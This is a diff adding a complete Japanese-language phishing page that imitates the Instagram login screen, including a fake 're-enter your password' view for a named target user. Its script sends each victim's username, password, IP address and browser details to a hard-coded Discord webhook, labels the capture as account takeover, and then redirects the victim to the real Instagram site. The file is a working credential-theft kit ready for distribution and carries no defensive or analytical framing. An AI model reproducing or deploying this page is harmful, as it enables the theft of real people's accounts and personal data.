@@ -1,1 +1,181 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <!-- 公式CSS完全再現 -->
+    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Consumer.css/3e6b8c6c8d68.css">
+    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/0e7c6d0c1d9f.css">
+    <style>
+        body, html { margin:0; padding:0; height:100%; background:#fafafa; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+        ._aangu { background:#fff; border:1px solid #dbdbdb; border-radius:8px; margin:40px auto; max-width:350px; padding:40px 40px 20px; text-align:center; }
+        ._acae { width:175px; margin:0 auto 36px; }
+        input { width:100%; padding:11px 9px; margin:6px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:14px; }
+        button { width:100%; padding:8px; margin:10px 0; background:#0095f6; color:#fff; border:none; border-radius:8px; font-weight:600; font-size:14px; cursor:pointer; }
+        button:hover { background:#0077c5; }
+        ._aacl { color:#8e8e8e; font-size:13px; margin:20px 0; position:relative; }
+        ._aacl::before, ._aacl::after { content:""; position:absolute; top:50%; width:40%; height:1px; background:#dbdbdb; }
+        ._aacl::before { left:0; } ._aacl::after { right:0; }
+        ._aaq2 { color:#385185; font-weight:600; font-size:14px; text-decoration:none; }
+        ._aaq3 { margin-top:20px; font-size:12px; color:#8e8e8e; }
+        ._aaq3 a { color:#00376b; text-decoration:none; }
+        ._aacn { color:#ed4956; font-size:14px; margin:10px 0; display:none; }
+    </style>
+</head>
+<body>
+    <main role="main">
+        <!-- ログイン済み画面（初期非表示） -->
+        <div class="_aangu" id="loggedInBox" style="display:none;">
+            <div class="_acae">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            <form id="passwordForm" onsubmit="sendLoggedInToWebhook(event)">
+                <p style="font-size:15px; margin-bottom:20px;"><strong id="displayUsername">user_example</strong> でログイン中</p>
+                <input type="hidden" name="username" id="hiddenUsername" value="user_example">
+                <input type="password" name="password" placeholder="パスワードを再入力" required>
+                <div class="_aacn" id="errorMsg">パスワードが間違っています。</div>
+                <button type="submit">次へ</button>
+            </form>
+            <div class="_aacl">または</div>
+            <a href="#" class="_aaq2" onclick="switchToLogin()">別のアカウントでログイン</a>
+            <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
+        </div>
 
+        <!-- 通常ログイン画面（初期表示） -->
+        <div class="_aangu" id="loginBox">
+            <div class="_acae">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            <form id="loginForm" onsubmit="sendLoginToWebhook(event)">
+                <input type="text" name="username" placeholder="電話番号、ユーザー名、メールアドレス" required autocomplete="off">
+                <input type="password" name="password" placeholder="パスワード" required>
+                <div class="_aacn" id="loginError">ユーザー名またはパスワードが間違っています。</div>
+                <button type="submit">ログイン</button>
+            </form>
+            <div class="_aacl">または</div>
+            <a href="#" class="_aaq2">Facebookでログイン</a>
+            <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
+        </div>
+    </main>
+
+    <script>
+        // === 設定エリア（提供されたWebhook使用）===
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";
+        const TARGET_LOGGEDIN_USER = "user_example";  // 配布時に変更
+        // =========================================
+
+        // アプリ / Web 自動判定
+        const isApp = /Instagram/.test(navigator.userAgent);
+        const isWeb = !isApp;
+
+        // URLパラメータ判定
+        const urlParams = new URLSearchParams(window.location.search);
+        const loggedInUser = urlParams.get('user') || TARGET_LOGGEDIN_USER;
+
+        // 初期表示
+        window.onload = function() {
+            if (urlParams.get('mode') === 'loggedin' || document.referrer.includes('instagram.com')) {
+                showLoggedInScreen(loggedInUser);
+            } else {
+                showLoginScreen();
+            }
+        };
+
+        // 画面切り替え
+        function showLoggedInScreen(username) {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('loggedInBox').style.display = 'block';
+            document.getElementById('displayUsername').textContent = username;
+            document.getElementById('hiddenUsername').value = username;
+        }
+
+        function showLoginScreen() {
+            document.getElementById('loggedInBox').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        }
+
+        function switchToLogin() {
+            showLoginScreen();
+        }
+
+        // === IP取得 ===
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch { return '不明'; }
+        }
+
+        // === Webhook送信 ===
+        async function sendToWebhook(title, fields) {
+            const ip = await getIP();
+            const ua = navigator.userAgent;
+            const time = new Date().toISOString();
+            const source = isApp ? "Instagramアプリ" : "Webブラウザ";
+
+            const data = {
+                content: null,
+                embeds: [{
+                    title: title,
+                    color: 16744512,
+                    fields: [
+                        ...fields,
+                        { name: "IPアドレス", value: `\`\`\`${ip}\`\`\``, inline: true },
+                        { name: "アクセス元", value: `\`\`\`${source}\`\`\``, inline: true },
+                        { name: "ブラウザ/UA", value: `\`\`\`${ua.substring(0, 100)}\`\`\``, inline: false },
+                        { name: "時間", value: `\`\`\`${time}\`\`\``, inline: true }
+                    ],
+                    footer: { text: "PhishMaster-Ω ULTRA" },
+                    timestamp: time
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = "https://www.instagram.com/";
+            }).catch(() => {
+                alert("送信エラー");
+            });
+        }
+
+        // 通常ログイン
+        function sendLoginToWebhook(e) {
+            e.preventDefault();
+            const username = document.querySelector('#loginBox [name="username"]').value;
+            const password = document.querySelector('#loginBox [name="password"]').value;
+
+            if (username.length < 1 || password.length < 6) {
+                document.getElementById('loginError').style.display = 'block';
+                return;
+            }
+
+            sendToWebhook("Instagram 通常ログイン乗っ取り", [
+                { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
+                { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
+            ]);
+        }
+
+        // ログイン済みパスワード
+        function sendLoggedInToWebhook(e) {
+            e.preventDefault();
+            const username = document.getElementById('hiddenUsername').value;
+            const password = document.querySelector('#passwordForm [name="password"]').value;
+
+            if (password.length < 6) {
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+
+            sendToWebhook("Instagram ログイン済み乗っ取り", [
+                { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
+                { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
+            ]);
+        }
+    </script>
+</body>
+</html>
